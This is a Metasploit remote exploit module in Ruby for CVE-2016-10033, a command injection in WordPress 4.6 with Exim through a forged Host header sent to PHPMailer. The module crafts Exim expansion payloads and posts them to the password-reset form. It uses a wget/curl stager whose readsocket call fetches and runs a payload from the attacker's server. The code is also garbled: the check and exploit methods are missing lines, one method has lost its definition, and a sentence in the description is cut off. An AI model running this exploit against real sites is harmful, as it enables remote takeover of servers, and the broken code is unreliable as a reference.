# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = AverageRanking

  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;                => &#039;WordPress PHPMailer Host Header Command Injection&#039;,
      &#039;Description&#039;         => %q{
        This module exploits a command injection vulnerability in WordPress
        version 4.6 with Exim as an MTA via a spoofed Host header to PHPMailer,
        a mail-sending library that is bundled with WordPress.

        A valid WordPress username is required to exploit the vulnerability.
        Additionally, due to the altered Host header, exploitation is limited to
        the default virtual host, assuming the header isn&#039;t mangled in transit.

        If the target is running Apache 2.2.32 or 2.4.24 and later, the server
        containing parens from passing through, making exploitation unlikely.
      },
      &#039;Author&#039;              => [
        &#039;Dawid Golunski&#039;, # Vulnerability discovery
        &#039;wvu&#039;             # Metasploit module
      ],
      &#039;References&#039;          => [
        [&#039;CVE&#039;, &#039;2016-10033&#039;],
        [&#039;URL&#039;, &#039;https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html&#039;],
        [&#039;URL&#039;, &#039;http://www.exim.org/exim-html-current/doc/html/spec_html/ch-string_expansions.html&#039;],
        [&#039;URL&#039;, &#039;https://httpd.apache.org/docs/2.4/mod/core.html#httpprotocoloptions&#039;]
      ],
      &#039;DisclosureDate&#039;      => &#039;May 3 2017&#039;,
      &#039;License&#039;             => MSF_LICENSE,
      &#039;Platform&#039;            => &#039;linux&#039;,
      &#039;Arch&#039;                => [ARCH_X86, ARCH_X64],
      &#039;Privileged&#039;          => false,
      &#039;Targets&#039;             => [
        [&#039;WordPress 4.6 / Exim&#039;, {}]
      ],
      &#039;DefaultTarget&#039;       => 0,
      &#039;DefaultOptions&#039;      => {
        &#039;CMDSTAGER::FLAVOR&#039; => &#039;wget&#039;
      },
      &#039;CmdStagerFlavor&#039;     => [&#039;wget&#039;, &#039;curl&#039;]
    ))

    register_options([
      OptString.new(&#039;USERNAME&#039;, [true, &#039;WordPress username&#039;, &#039;admin&#039;])
    ])

    register_advanced_options([
      OptString.new(&#039;WritableDir&#039;, [true, &#039;Writable directory&#039;, &#039;/tmp&#039;])
    ])

    deregister_options(&#039;VHOST&#039;, &#039;URIPATH&#039;)
  end

  def check
      version = Gem::Version.new(version)
    else
      return CheckCode::Safe
    end

    vprint_status("WordPress #{version} installed at #{full_uri}")

    if version <= Gem::Version.new(&#039;4.6&#039;)
      CheckCode::Appears
    else
      CheckCode::Detected
    end
  end

  def exploit
    if check == CheckCode::Safe
      print_error("Is WordPress installed at #{full_uri} ?")
      return
    end

    # Since everything goes through strtolower(), we need lowercase
    print_status("Generating #{cmdstager_flavor} command stager")
    @cmdstager = generate_cmdstager(
      &#039;Path&#039;   => "/#{Rex::Text.rand_text_alpha_lower(8)}",
      :temp    => datastore[&#039;WritableDir&#039;],
      :file    => File.basename(cmdstager_path),
      :nospace => true
    ).join(&#039;;&#039;)

      vprint_status("Sending #{command}")
      send_request_payload(command)
    end
  end

  #
  # Exploit methods
  #


    # This is basically sh -c `wget` implemented using Exim string expansions
    # Badchars we can&#039;t encode away: \ for \n (newline) and : outside strings
      "{${readsocket{inet:#{srvhost_addr}:#{srvport}}" \
      "{get #{get_resource} http/1.0$value$value}}}}}}"

    # CmdStager should rm the file, but it blocks on the payload, so we do it
  end

  def send_request_payload(command)
    res = send_request_cgi(
      &#039;method&#039;        => &#039;POST&#039;,
      &#039;headers&#039;       => {
        &#039;Host&#039;        => generate_exim_payload(command)
      },
      &#039;vars_get&#039;      => {
        &#039;action&#039;      => &#039;lostpassword&#039;
      },
      &#039;vars_post&#039;     => {
        &#039;user_login&#039;  => datastore[&#039;USERNAME&#039;],
        &#039;redirect_to&#039; => &#039;&#039;,
        &#039;wp-submit&#039;   => &#039;Get New Password&#039;
      }
    )

    if res && !res.redirect?
      if res.code == 200 && res.body.include?(&#039;login_error&#039;)
        fail_with(Failure::NoAccess, &#039;WordPress username may be incorrect&#039;)
      elsif res.code == 400 && res.headers[&#039;Server&#039;] =~ /^Apache/
        fail_with(Failure::NotVulnerable, &#039;HttpProtocolOptions may be Strict&#039;)
      else
        fail_with(Failure::UnexpectedReply, "Server returned code #{res.code}")
      end
    end

    res
  end

  def generate_exim_payload(command)
    exim_payload  = Rex::Text.rand_text_alpha(8)
    exim_payload << "(#{Rex::Text.rand_text_alpha(8)} "
    exim_payload << "-be ${run{#{encode_exim_payload(command)}}}"
    exim_payload << " #{Rex::Text.rand_text_alpha(8)})"
  end

  # We can encode away the following badchars using string expansions
  def encode_exim_payload(command)
    command.gsub(/[\/ :]/,
      &#039;/&#039; => &#039;${substr{0}{1}{$spool_directory}}&#039;,
      &#039; &#039; => &#039;${substr{10}{1}{$tod_log}}&#039;,
      &#039;:&#039; => &#039;${substr{13}{1}{$tod_log}}&#039;
    )
  end

  #
  # Utility methods
  #

  def cmdstager_flavor
    datastore[&#039;CMDSTAGER::FLAVOR&#039;]
  end

  def cmdstager_path
    @cmdstager_path ||=
      "#{datastore[&#039;WritableDir&#039;]}/#{Rex::Text.rand_text_alpha_lower(8)}"
  end

  #
  # Override methods
  #

  # Return CmdStager on first request, payload on second
  def on_request_uri(cli, request)
    if @cmdstager
      print_good("Sending #{@cmdstager}")
      send_response(cli, @cmdstager)
      @cmdstager = nil
    else
      print_good("Sending payload #{datastore[&#039;PAYLOAD&#039;]}")
      super
    end
  end

end

